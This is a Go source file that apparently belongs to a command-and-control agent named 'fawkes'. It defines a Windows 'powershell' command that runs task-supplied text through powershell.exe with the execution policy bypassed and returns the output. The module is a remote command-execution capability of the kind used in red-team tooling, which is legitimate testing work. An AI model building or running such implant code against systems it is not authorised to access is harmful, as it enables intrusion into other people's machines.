//go:build windows
// +build windows

package commands

import (
	"fmt"
	"os/exec"
	"strings"

	"fawkes/pkg/structs"
)

// PowershellCommand implements the powershell command
type PowershellCommand struct{}

// Name returns the command name
func (c *PowershellCommand) Name() string {
	return "powershell"
}

// Description returns the command description
func (c *PowershellCommand) Description() string {
	return "Execute a PowerShell command or script"
}

// Execute executes the powershell command
func (c *PowershellCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: No command specified",
			Status:    "error",
			Completed: true,
		}
	}

	cmd := exec.Command(
		"powershell.exe",
		"-NoProfile",
		"-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-Command", task.Params,
	)

	output, err := cmd.CombinedOutput()

	if err != nil {
		outputStr := string(output)
		if outputStr != "" {
			return structs.CommandResult{
				Output:    fmt.Sprintf("%s\nError: %v", outputStr, err),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error executing PowerShell: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	outputStr := strings.TrimSpace(string(output))
	if outputStr == "" {
		outputStr = "Command executed successfully (no output)"
	}

	return structs.CommandResult{
		Output:    outputStr,
		Status:    "success",
		Completed: true,
	}
}
